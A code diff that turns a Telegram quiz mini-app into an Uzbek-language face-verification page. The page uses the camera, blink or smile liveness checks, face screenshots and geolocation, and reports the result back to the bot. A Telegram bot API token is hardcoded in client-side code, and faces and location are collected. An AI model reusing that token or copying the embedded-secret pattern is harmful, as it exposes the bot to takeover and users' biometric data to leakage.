@@ -1,16 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="uz">
 
 <head>
-    <title>Quiz Bot</title>
-    <meta charset="UTF-8" />
-    <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <meta name="author" content="Shinkarenko Max" />
-
-    <script src="https://cdn.tailwindcss.com?plugins=forms"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta property="og:site_name" content="Yuzni aniqlash va jonlilikni tekshirish">
+    <meta property="og:title" content="Shaxsni aniqlash">
+    <title>FaceID tizimi</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
+        Telegram.WebApp.setHeaderColor('#000000')
+        Telegram.WebApp.setBackgroundColor('#000000')
+        Telegram.WebApp.setBottomBarColor('#e7e7e7')
+        Telegram.WebApp.expand()
+        Telegram.WebApp.disableVerticalSwipes()
         function setThemeClass() {
             document.documentElement.className = Telegram.WebApp.colorScheme;
         }
@@ -19,251 +22,459 @@
     </script>
 
     <style>
-        /* .wrapper {
-        height: 100%;
-        width: 100%;
-        max-width: 640px;
-        margin-left: auto;
-        margin-right: auto;
-      } */
-        .tg-height {
-            height: var(--tg-viewport-stable-height, 100vh);
-            transition: height 0.35s linear;
+        body,
+        html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
         }
 
-        .btn {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
+        /* Video va overlay uchun konteyner */
+        #container {
             position: relative;
-            margin: 10px 0;
-            border-radius: 8px;
-            color: #ffffff;
-            border: none;
-            background-color: #667eea;
-            letter-spacing: 1px;
-            font-weight: bold;
-            text-transform: uppercase;
-            cursor: pointer;
-            -webkit-transition: all 150ms ease;
-            transition: all 150ms ease;
+            width: 640px;
+            height: 470px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
-        .btn:active {
-            -webkit-transform: translateY(-3%);
-            transform: translateY(-3%);
-            -webkit-box-shadow: 0 4px 8px rgba(255, 255, 255, 0.08);
-            box-shadow: 0 4px 8px rgba(255, 255, 255, 0.08);
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            /* Kamera ko‘rinishini teskari qilish */
+            -webkit-transform: scaleX(-1);
+            /* Safari uchun */
         }
 
-        .btn:disabled,
-        .btn[disabled] {
-            background-color: rgb(229, 229, 229);
-            color: rgb(175, 175, 175);
+        /* Yuzni moslashtirish uchun oval overlay */
+        #overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 4px solid red;
+            /* Standart qizil rang */
+            width: 250px;
+            height: 350px;
+            border-radius: 50%;
+            pointer-events: none;
         }
 
-        #progressbar-full {
-            width: 0%;
-            transition: width 0.55s linear;
+        #status {
+            height: 80px;
+            margin-top: 10px;
+            color: white;
+            font-size: 30px;
+            text-align: center;
+        }
+
+        /* Ovaldan tashqaridagi blur effekti */
+        #blurOverlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            clip-path: path('M0,0H640V480H0Z M319,65 A125,175,0,1,0,319.9,65Z');
+            pointer-events: none;
         }
     </style>
 </head>
 
 <body>
-    <div class="container mx-auto tg-height flex justify-center items-center w-full max-w-xs px-6">
-        <div class="w-full">
-            <div>
-                <span id="progress-text" class="text-base dark:text-blue-500 text-blue-600"></span>
-                <div id="progressbar" class="w-9/12 border-0 rounded-full h-2 bg-slate-200">
-                    <div id="progressbar-full" class="h-full rounded-full dark:bg-blue-500 bg-blue-600"></div>
-                </div>
-            </div>
-            <div class="flex justify-center">
-                <div id="content-section">
-                    <p class="text-base leading-relaxed mt-0 mb-4 dark:text-white text-gray-800" id="question"></span>
-                    <div id="answers" class="disabled:opacity-5 opacity-1" onchange="changeAnswer()"></div>
-                </div>
-            </div>
-            <div class="flex space-x-2 justify-center">
-                <button class="btn w-1/2 h-10" id="sendanswer">answer</button>
-            </div>
-        </div>
+    <canvas id="captureCanvas" style="display: none;"></canvas>
+    <div id="status">Sahifa yuklanmoqda...</div>
+    <div id="container">
+        <video id="video" autoplay playsinline muted></video>
+        <div id="blurOverlay"></div>
+        <div id="overlay"></div>
     </div>
+    <button id="retryCamera" style="display: none;" onclick="retryCameraSetup()">Kamerani qayta ishga tushirish</button>
+
+    <!-- face-api.js yuklash -->
+    <script src="js/face-api.js"></script>
+
     <script>
-        // Setup tailwind config
-        tailwind.config = {
-            darkMode: 'class',
-            variants: {
-                extend: {
-                    opacity: ['disabled'],
-                    textColor: ['dark'],
-                },
-            },
-        };
-
-        // Set bot to ready state
-        Telegram.WebApp.ready();
-
-        // Get personalized data from Telegram
-        let initData = Telegram.WebApp.initData || '';
-        console.log('initData: ', initData);
+        const tg = Telegram.WebApp;
+        tg.ready();
+        console.log(tg.initData);
         
+        const video = document.getElementById("video");
+        const statusText = document.getElementById("status");
+        const overlay = document.getElementById("overlay");
+        const { chat_id } = getQueryParams();
 
-        // Init state of button
-        const sendBtn = document.getElementById('sendanswer');
-        sendBtn.disabled = true;
+        let latitude = 0;
+        let longitude = 0;
+        let gotPhoto = false;
+        let blinkCounter = 0;
+        let blinkState = false;
+        let faceInsideOval = false;
+        const blinkThreshold = 0.25;
+        const SMILE_THRESHOLD = 0.5;
 
-        let rightAsnwersCounter = 0;
-        let questionCounter = 0;
-        const MAX_QUESTIONS = 3;
-        const questions = [
-            {
-                question: 'What country has the highest life expectancy?',
-                answers: ['Hong Kong', 'Switzerland', 'Singapore', 'Italy'],
-                rightAnswer: 0,
-            },
-            {
-                question: 'The tallest building in the world is located in which city?',
-                answers: ['Dubai', 'New York', 'Shanghai', 'None of the above'],
-                rightAnswer: 0,
-            },
-            {
-                question: 'Which country do cities of Perth, Adelade & Brisbane belong to',
-                answers: ['USA', 'Greece', 'Australia'],
-                rightAnswer: 2,
-            },
-        ];
+        function getQueryParams() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return {
+                chat_id: urlParams.get("chat_id") || 720530019,
+            };
+        }
 
-        const changeAnswer = (e) => {
-            sendBtn.disabled = false;
-        };
+        async function checkCameraCapabilities() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === "videoinput");
 
-        const disableForm = (isDisable) => {
-            const answers = document.querySelector('#answers').children;
-
-            for (const el of answers) {
-                const inputs = el.getElementsByTagName('input');
-                const labels = el.getElementsByTagName('label');
-
-                for (const input of inputs) {
-                    input.disabled = isDisable;
+                if (videoDevices.length === 0) {
+                    statusText.textContent = "Kamera aniqlanmadi!";
+                    throw new Error("Kamera topilmadi.");
                 }
 
-                for (const label of labels) {
-                    label.disabled = isDisable;
-                    label.classList.toggle('opacity-50');
+                const permissions = await navigator.permissions.query({ name: "camera" });
+                if (permissions.state === "denied") {
+                    statusText.textContent = "Kameraga ruxsat berilmagan. Brauzer sozlamalaridan ruxsat bering.";
+                    throw new Error("Kamera ruxsatlari rad etildi.");
                 }
+            } catch (error) {
+                console.error("Kamera tekshiruvi xatosi:", error);
+                document.getElementById("retryCamera").style.display = "block";
+                statusText.textContent = "Kamera mavjud emas. Qurilma va ruxsatlarni tekshiring.";
             }
-        };
+        }
 
-        const getNewQuestion = () => {
-            questionCounter++;
+        async function retryCameraSetup() {
+            document.getElementById("retryCamera").style.display = "none";
+            await setupCamera();
+        }
 
-            // If quiz is ended - return back
-            if (questionCounter > MAX_QUESTIONS) {
-                sendAnswer();
-                return;
+        function checkBrowserCompatibility() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                statusText.textContent = "Brauzeringiz kamerani qo‘llab-quvvatlamaydi. Chrome, Firefox yoki Edge'ning so‘nggi versiyasidan foydalaning.";
+                return false;
             }
 
-            const questionsIndex = questionCounter - 1;
-            const currentQuestion = questions[questionsIndex];
+            return true;
+        }
 
-            // Update progress
-            const progressText = document.getElementById('progress-text');
-            const progressBarFull = document.getElementById('progressbar-full');
-            progressText.innerText = `${questionCounter} of ${MAX_QUESTIONS}`;
-            progressBarFull.style.width = `${(questionCounter / MAX_QUESTIONS) * 100}%`;
-
-            // Update question and answers
-            const answersContainer = document.getElementById('answers');
-            const question = document.getElementById('question');
-
-            question.innerText = currentQuestion.question;
-            answersContainer.innerHTML = '';
-
-            currentQuestion.answers.map((answer, k) => {
-                const answerId = `answer-${k + 1}`;
-                const itemContainer = document.createElement('div');
-
-                const input = document.createElement('input');
-                input.name = 'answer';
-                input.type = 'radio';
-                input.id = `answer-${k + 1}`;
-                input.dataset.id = k;
-                input.classList.add(
-                    'rounded-full',
-                    'h-4',
-                    'w-4',
-                    'border',
-                    'dark:border-white',
-                    'border-gray-300',
-                    'bg-white',
-                    'dark:checked:bg-blue-500',
-                    'dark:checked:border-blue-500',
-                    'checked:bg-blue-600',
-                    'checked:border-blue-600',
-                    'focus:outline-none',
-                    'transition',
-                    'duration-200',
-                    'mt-1',
-                    'align-top',
-                    'bg-no-repeat',
-                    'bg-center',
-                    'bg-contain',
-                    'float-left',
-                    'mr-2',
-                    'cursor-pointer'
-                );
-
-                const label = document.createElement('label');
-                label.htmlFor = answerId;
-                label.innerText = answer;
-                label.classList.add('inline-block', 'dark:text-white', 'text-gray-800');
-
-                itemContainer.appendChild(input);
-                itemContainer.appendChild(label);
-
-                answersContainer.appendChild(itemContainer);
-            });
-        };
-
-        const sendAnswer = () => {
-            // If user visited by not inline keyboard we can't reply him with backend
-            if (!initData) {
-                const result = `Right answers: ${rightAsnwersCounter} of ${MAX_QUESTIONS}`;
-                Telegram.WebApp.sendData(result);
-                Telegram.WebApp.close();
-            } else {
-                const result = `Right answers: ${rightAsnwersCounter} of ${MAX_QUESTIONS}`;
-                Telegram.WebApp.sendData(result);
-                // Telegram.WebApp.close();
-                console.log('Send data to server is not implemented');
+        async function setupCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        aspectRatio: 1,
+                        width: { max: 1080 },
+                        height: { max: 1080 },
+                        facingMode: "user",
+                        advanced: [{ zoom: 1.0 }]
+                    },
+                    audio: false
+                });
+                video.srcObject = stream;
+                await video.play();
+                statusText.textContent = "Kamera faollashtirildi, modellar yuklanmoqda...";
+            } catch (error) {
+                statusText.textContent = "Kamera ruxsatlari rad etildi!";
+                document.getElementById("retryCamera").style.display = "block";
+                console.error(error);
             }
-        };
+        }
 
-        // When button is clicked check answer and send next question else send data to server
-        sendBtn.addEventListener('click', (e) => {
-            e.preventDefault();
+        function stopVideoStream() {
+            if (video.srcObject) {
+                let stream = video.srcObject;
+                let tracks = stream.getTracks();
 
-            const checkedAnswer = parseInt(
-                document.querySelector('input[name=answer]:checked').dataset.id
+                tracks.forEach(track => {
+                    track.stop(); // ✅ Stops the camera
+                });
+
+                video.srcObject = null;
+            }
+        }
+
+        async function loadModels() {
+            await faceapi.nets.tinyFaceDetector.loadFromUri('models');
+            await faceapi.nets.faceLandmark68Net.loadFromUri('models');
+            await faceapi.nets.faceRecognitionNet.loadFromUri('models');
+            await faceapi.nets.faceExpressionNet.loadFromUri('models');
+
+            statusText.textContent = "Modellar yuklandi. Yuz aniqlanmoqda...";
+            await detectFace();
+        }
+
+        function isPointInOval(point, oval) {
+            let cx = oval.left + oval.width / 2;
+            let cy = oval.top + oval.height / 2;
+            let rx = oval.width / 2;
+            let ry = oval.height / 2;
+            let dx = point.x - cx;
+            let dy = point.y - cy;
+            // Adjust face center based on this threshold ex: 0.1            
+            return (dx * dx) / (rx * rx) + (dy * dy) / (ry * ry) <= 0.1;
+        }
+
+        async function detectFace() {
+            const videoRect = video.getBoundingClientRect();
+            const ovalRect = overlay.getBoundingClientRect();
+
+            setInterval(async () => {
+                const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions(
+                    {
+                        inputSize: 160, // Reduce image resolution to speed up detection
+                        scoreThreshold: 0.6 // Increase threshold to avoid false positives
+                    }
+                )).withFaceLandmarks().withFaceExpressions();
+
+                if (detections) {
+                    let faceBox = detections.detection.box;
+                    let faceCenter = { x: faceBox.x + faceBox.width / 2, y: faceBox.y + faceBox.height / 2 };
+
+                    let scaleX = videoRect.width / video.videoWidth;
+                    let scaleY = videoRect.height / video.videoHeight;
+
+                    let faceCenterViewport = {
+                        x: videoRect.left + faceCenter.x * scaleX,
+                        y: videoRect.top + faceCenter.y * scaleY
+                    };
+
+                    faceInsideOval = isPointInOval(faceCenterViewport, ovalRect);
+
+                    if (faceInsideOval) {
+                        const isBlinking = detectBlink(detections);
+                        const isSmiling = detectSmile(detections);
+
+                        if (isBlinking || isSmiling) {
+                            blinkCounter++;
+
+                            if (blinkCounter > 1) { // Birinchi marta qovoqni ochish e’tiborga olinmaydi
+                                blinkState = true;
+                                overlay.style.borderColor = "green";
+                                statusText.textContent = "Shaxsingiz tasdiqlandi!";
+                            }
+                        } else {
+                            if (blinkState) {
+                                overlay.style.borderColor = "green";
+                                statusText.textContent = "Shaxsingiz tasdiqlandi!";
+                                if (!gotPhoto) {
+                                    gotPhoto = true;
+                                    setTimeout(async () => {
+                                        const dataURL = takeScreenshot("blink", detections.detection.box);
+                                        // await sendToTelegramBot(dataURL);
+                                        await sendMessageToTelegramBot(latitude, longitude);
+                                        // Telegram.WebApp.close();
+                                    }, 100);
+                                }
+                            } else {
+                                overlay.style.borderColor = "green"; // Yashil - yuz oval ichida
+                                statusText.textContent = "Bir marta jilmaying yoki ko'zingizni yumib oching!";
+                            }
+                        }
+                    } else {
+                        blinkState = false;
+                        overlay.style.borderColor = "red"; // Qizil - ovaldan tashqarida
+                        statusText.textContent = "Yuzingizni oval ichiga joylashtiring!";
+                    }
+                } else {
+                    overlay.style.borderColor = "red";
+                    statusText.textContent = "Yuz aniqlanmadi!";
+                }
+            }, 100);
+        }
+
+        function detectBlink(detections) {
+            const landmarks = detections.landmarks;
+            const leftEye = landmarks.getLeftEye();
+            const rightEye = landmarks.getRightEye();
+
+            function eyeAspectRatio(eye) {
+                const a = distance(eye[1], eye[5]);
+                const b = distance(eye[2], eye[4]);
+                const c = distance(eye[0], eye[3]);
+                return (a + b) / (2.0 * c);
+            }
+
+            function distance(point1, point2) {
+                return Math.sqrt(Math.pow(point1._x - point2._x, 2) + Math.pow(point1._y - point2._y, 2));
+            }
+
+            const leftEAR = eyeAspectRatio(leftEye);
+            const rightEAR = eyeAspectRatio(rightEye);
+            const EAR = (leftEAR + rightEAR) / 2.0;
+
+            return EAR < blinkThreshold; // Threshold for blink detection
+        }
+
+        function detectSmile(detections) {
+            const expressions = detections.expressions;
+            const smileProbability = expressions.happy || 0;
+
+            return smileProbability > SMILE_THRESHOLD;
+        }
+
+        function takeScreenshot(state, faceBox) {
+            const canvas = document.getElementById("captureCanvas");
+            const context = canvas.getContext("2d");
+
+            // Define padding for extra space around the face
+            const widthPadding = 30; // Adjust this value for more/less padding
+            const heightPadding = 60; // Adjust this value for more/less padding
+            const videoWidth = video.videoWidth;
+            const videoHeight = video.videoHeight;
+
+            // Calculate new dimensions with padding
+            const x = Math.max(0, faceBox.x - widthPadding); // Ensure it doesn't go out of bounds
+            const y = Math.max(0, faceBox.y - heightPadding);
+            const width = Math.min(faceBox.width + 2 * widthPadding, videoWidth - x); // Keep within video bounds
+            const height = Math.min(faceBox.height + 2 * heightPadding, videoHeight - y);
+
+            // Set canvas size to match the padded face area
+            canvas.width = width;
+            canvas.height = height;
+
+            // Flip context horizontally before drawing
+            context.translate(width, 0);
+            context.scale(-1, 1);
+
+            // Draw the padded face area onto the canvas
+            context.drawImage(
+                video,
+                x, // Source X (top-left corner with padding)
+                y, // Source Y (top-left corner with padding)
+                width, // Source width (face width with padding)
+                height, // Source height (face height with padding)
+                0, // Destination X (start at top-left of the canvas)
+                0, // Destination Y (start at top-left of the canvas)
+                canvas.width, // Destination width
+                canvas.height // Destination height
             );
-            const currentQuestion = questions[questionCounter - 1];
-            if (checkedAnswer === currentQuestion.rightAnswer) {
-                rightAsnwersCounter++;
+
+            // Convert canvas content to a data URL (Base64 image)
+            const dataURL = canvas.toDataURL("image/png");
+
+            // Save the image or display it (example: console log the URL)
+            console.log(`Screenshot (${state})`);
+
+            return dataURL;
+        }
+
+        async function sendToTelegramBot(dataURL) {
+            const botToken = "7907821344:AAEJYy-7K_8aDZlxeYGdDXPTHqBsOQNj40k";
+            // Convert base64 to Blob
+            function dataURLtoBlob(dataURL) {
+                const byteString = atob(dataURL.split(",")[1]);
+                const mimeString = dataURL.split(",")[0].split(":")[1].split(";")[0];
+                const arrayBuffer = new ArrayBuffer(byteString.length);
+                const uint8Array = new Uint8Array(arrayBuffer);
+                for (let i = 0; i < byteString.length; i++) {
+                    uint8Array[i] = byteString.charCodeAt(i);
+                }
+                return new Blob([arrayBuffer], { type: mimeString });
             }
 
-            disableForm(true);
+            // Convert to Blob
+            const imageBlob = dataURLtoBlob(dataURL);
+            const formData = new FormData();
+            formData.append("chat_id", chat_id);
+            formData.append("photo", imageBlob, "screenshot.png");
 
-            sendBtn.disabled = true;
+            // Send image to Telegram bot
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
 
-            getNewQuestion();
+            if (response.ok) {
+                console.log('Message sent successfully');
+            } else {
+                console.error('Failed to send message');
+            }
+        }
+
+        async function sendMessageToTelegramBot(latitude, longitude) {
+            const verificationData = {
+                chat_id: chat_id,
+                latitude: latitude,
+                longitude: longitude,
+                verification_status: "✅ Shaxsingiz tasdiqlandi!"
+            };
+
+            // ✅ Send data directly to Telegram bot
+            tg.sendData(JSON.stringify(verificationData));
+            console.log(2);
+        }
+
+        async function handleGeoPermission() {
+            try {
+                const result = await navigator.permissions.query({ name: 'geolocation' });
+                console.log('Permission:', result.state);
+
+                if (result.state === 'granted') {
+                    console.log('Permission already granted');
+
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: false,
+                            maximumAge: 30000,
+                            timeout: 20000
+                        });
+                    });
+                    latitude = position.coords.latitude;
+                    longitude = position.coords.longitude;
+
+                    console.log(position.coords.latitude, position.coords.longitude);
+                } else if (result.state === 'prompt') {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: false,
+                                maximumAge: 30000,
+                                timeout: 20000
+                            });
+                        });
+
+                        latitude = position.coords.latitude;
+                        longitude = position.coords.longitude;
+                        console.log('Permission granted');
+                        console.log(position.coords.latitude, position.coords.longitude);
+                    } catch {
+                        console.log('Permission denied');
+                    }
+                }
+
+                result.onchange = () => {
+                    console.log('Permission:', result.state);
+                };
+            } catch (error) {
+                console.error('Error checking permissions:', error);
+            }
+        }
+
+
+        // Initialize system
+        async function initialize() {
+            const isCompatible = checkBrowserCompatibility();
+            if (!isCompatible) return;
+
+            await checkCameraCapabilities();
+            await handleGeoPermission();
+            await setupCamera();
+            await loadModels();
+        }
+
+        document.addEventListener("DOMContentLoaded", async () => {
+            initialize();
         });
 
-        window.addEventListener('load', (e) => {
-            getNewQuestion();
-        });
     </script>
 </body>
 
